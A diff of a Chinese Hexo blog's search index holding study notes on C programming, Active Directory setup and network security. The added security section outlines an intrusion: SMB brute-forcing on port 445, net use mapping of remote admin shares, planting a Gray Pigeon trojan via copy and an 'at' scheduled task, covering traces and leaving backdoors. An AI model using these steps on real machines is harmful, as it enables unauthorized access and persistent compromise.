@@ -1,30 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>小毛病的治理</title>
-    <url>/2020/06/10/%E5%B0%8F%E6%AF%9B%E7%97%85%E7%9A%84%E6%B2%BB%E7%90%86/</url>
-    <content><![CDATA[<p>各种乱七八糟的东西。。。</p>
-<a id="more"></a>
-<h1 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h1><p><strong>无法解析的外部符号</strong><br>VS中出现：error LNK2019: 无法解析的外部符号 <strong>imp</strong>PlaySoundA@12，该符号在函数 …. 中被引用….的编译错误是，一般是是因为PlaySound函数在Winmm.lib库中，所有需要需要链接库，以下方法可解决：</p>
-<ol>
-<li>头文件中声明：#pragma comment(lib, “winmm”)</li>
-<li>菜单Project –&gt; Settings…–&gt;Link标签–&gt;Object/Library modules:中加入Winmm.lib</li>
-</ol>
-<hr>
-<h1 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h1><h2 id="备选拼写：ios646-h头文件"><a href="#备选拼写：ios646-h头文件" class="headerlink" title="备选拼写：ios646.h头文件"></a>备选拼写：ios646.h头文件</h2><p>如果c语言程序中包含该头文件，便可以用<code>and</code>代替<code>&amp;&amp;</code>，<code>or</code>代替<code>||</code>，<code>not</code>代替<code>!</code></p>
-<hr>
-<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>C99规定，可以在初始化列表中使用带方括号的小标知名待初始化的元素<br><code>int arr[6]={[5]=212};</code>//把arr[5]初始化为212<br>对于一般的初始化，在初始化一个元素后，未初始化的元素都会被设置为0</p>
-<hr>
-<p>除初始化外，不允许使用花括号的形式赋值</p>
-]]></content>
-      <categories>
-        <category>零碎</category>
-      </categories>
-      <tags>
-        <tag>零碎</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows程序设计</title>
     <url>/2020/06/10/Windows%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
     <content><![CDATA[<p>《Windows程序设计》学习，漫长的过程，加油冲冲冲！~</p>
@@ -240,7 +216,7 @@
 <h2 id="域的组成"><a href="#域的组成" class="headerlink" title="域的组成"></a>域的组成</h2><p>1)域控制器：DC(Domain Controller)<br>2)成员机</p>
 <h2 id="域的部署"><a href="#域的部署" class="headerlink" title="域的部署"></a>域的部署</h2><p>1)安装域控制器–就生成了域环境<br>2)安装了活动目录–就生成了域控制器<br>3)活动目录：Active Directory=AD</p>
 <h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>1)AD<br>2)特点：集中管理/统一管理</p>
-<h2 id="组策略GPO"><a href="#组策略GPO" class="headerlink" title="组策略GPO"></a>组策略GPO</h2><h2 id="部署安装活动目录"><a href="#部署安装活动目录" class="headerlink" title="部署安装活动目录"></a>部署安装活动目录</h2><p>1)开启2008虚拟机，连接到vmnet2<br>2)配置静态IP地址10.1.1.1<br>3)开始-运行-输入dcpromo，安装活动目录：<br>弹出向导-新林中新建域-功能级别都设置为2003-域的FQDN(<strong>.com)-设置目录服务还原密码**</strong>-勾选安装后自动重启<br>4)在DC上登录域<code>**\administrator</code>—DC的本地管理员升级为域管理员<br>5)验证AD是否安装成功：<br>计算机右键属性-所属域<br>DNS服务器中是否自动创建**.com区域文件<br>自动注册DC的域名解析记录<br>开始-管理工具-AD用户和计算机(computer：普通域成员机列表、Domain Controller：DC列表、users：域账号)</p>
+<h2 id="组策略GPO"><a href="#组策略GPO" class="headerlink" title="组策略GPO"></a>组策略GPO</h2><h2 id="部署安装活动目录"><a href="#部署安装活动目录" class="headerlink" title="部署安装活动目录"></a>部署安装活动目录</h2><p>1)开启2008虚拟机，连接到vmnet2<br>2)配置静态IP地址10.1.1.1<br>3)开始-运行-输入dcpromo，安装活动目录：<br>弹出向导-新林中新建域-功能级别都设置为2003-域的FQDN(xxx.com)-<strong>设置目录服务还原密码</strong>-勾选安装后自动重启<br>4)在DC上登录域<code>**\administrator</code>—DC的本地管理员升级为域管理员<br>5)验证AD是否安装成功：<br>计算机右键属性-所属域<br>DNS服务器中是否自动创建**.com区域文件<br>自动注册DC的域名解析记录<br>开始-管理工具-AD用户和计算机(computer：普通域成员机列表、Domain Controller：DC列表、users：域账号)</p>
 <h2 id="PC加入域"><a href="#PC加入域" class="headerlink" title="PC加入域"></a>PC加入域</h2><p>1.配置IP，并指DNS<br>2.计算机右键属性–更改–加入**.com<br>3.重启加入域后，成功使用域用户登录成员机</p>
 <h2 id="常见小问题"><a href="#常见小问题" class="headerlink" title="常见小问题"></a>常见小问题</h2><p>加入域不成功</p>
 <ol>
@@ -291,12 +267,67 @@
 <li>颁发者的数字签名</li>
 </ol>
 <p>数字证书由权威公正的第三方机构即CA签发</p>
+<h2 id="渗透简单测试"><a href="#渗透简单测试" class="headerlink" title="渗透简单测试"></a>渗透简单测试</h2><ol>
+<li>授权</li>
+<li>信息收集<br>nslookup、whois、</li>
+<li>扫描漏洞<br>namp=ip范围 端口(IIS、apache，什么网站)<br>高级扫描：<br>如IIS漏洞2003-IIS6.0、2008-IIS7.0<br>扫描网站漏洞</li>
+<li>漏洞利用</li>
+<li>提权(shell环境、桌面、最高权限)</li>
+</ol>
+<hr>
+<ol start="6">
+<li>毁尸灭迹</li>
+<li>留后门</li>
+<li>渗透测试报告</li>
+</ol>
+<hr>
+<p>手工测试端口号开放：<br>telnet IP地址 测试端口</p>
+<ol>
+<li><p>scanport扫描445端口</p>
+</li>
+<li><p>漏洞利用之IPC$:<br>进行暴力破解:NTscan<br>暴力破解系统密码之445</p>
+</li>
+<li><p>命令行控制对方</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use f: \\ip地址\文件夹 密码 &#x2F;user:用户</span><br><span class="line">net use f： &#x2F;del</span><br><span class="line">net use * &#x2F;del</span><br><span class="line">net use f: \\ip地址\c$ 密码 &#x2F;user:用户</span><br><span class="line">net use f: \\ip地址\ipc$ 密码 &#x2F;user:用户</span><br></pre></td></tr></table></figure></li>
+<li><p>制作木马<br>灰鸽子软件制作木马</p>
+</li>
+<li><p>copy植入木马(留后门)<br>copy D:\muma.exe \ip地址\c$</p>
+</li>
+<li><p>设置计划任务自动执行木马：<br>net time \ip地址<br>at \ip地址 时间 “路径”<br>等待</p>
+</li>
+<li><p>等待肉鸡上线</p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>安全</category>
       </categories>
       <tags>
         <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>小毛病的治理</title>
+    <url>/2020/06/10/%E5%B0%8F%E6%AF%9B%E7%97%85%E7%9A%84%E6%B2%BB%E7%90%86/</url>
+    <content><![CDATA[<p>各种乱七八糟的东西。。。</p>
+<a id="more"></a>
+<h1 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h1><p><strong>无法解析的外部符号</strong><br>VS中出现：error LNK2019: 无法解析的外部符号 <strong>imp</strong>PlaySoundA@12，该符号在函数 …. 中被引用….的编译错误是，一般是是因为PlaySound函数在Winmm.lib库中，所有需要需要链接库，以下方法可解决：</p>
+<ol>
+<li>头文件中声明：#pragma comment(lib, “winmm”)</li>
+<li>菜单Project –&gt; Settings…–&gt;Link标签–&gt;Object/Library modules:中加入Winmm.lib</li>
+</ol>
+<hr>
+<h1 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h1><h2 id="备选拼写：ios646-h头文件"><a href="#备选拼写：ios646-h头文件" class="headerlink" title="备选拼写：ios646.h头文件"></a>备选拼写：ios646.h头文件</h2><p>如果c语言程序中包含该头文件，便可以用<code>and</code>代替<code>&amp;&amp;</code>，<code>or</code>代替<code>||</code>，<code>not</code>代替<code>!</code></p>
+<hr>
+<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>C99规定，可以在初始化列表中使用带方括号的小标知名待初始化的元素<br><code>int arr[6]={[5]=212};</code>//把arr[5]初始化为212<br>对于一般的初始化，在初始化一个元素后，未初始化的元素都会被设置为0</p>
+<hr>
+<p>除初始化外，不允许使用花括号的形式赋值</p>
+]]></content>
+      <categories>
+        <category>零碎</category>
+      </categories>
+      <tags>
+        <tag>零碎</tag>
       </tags>
   </entry>
   <entry>
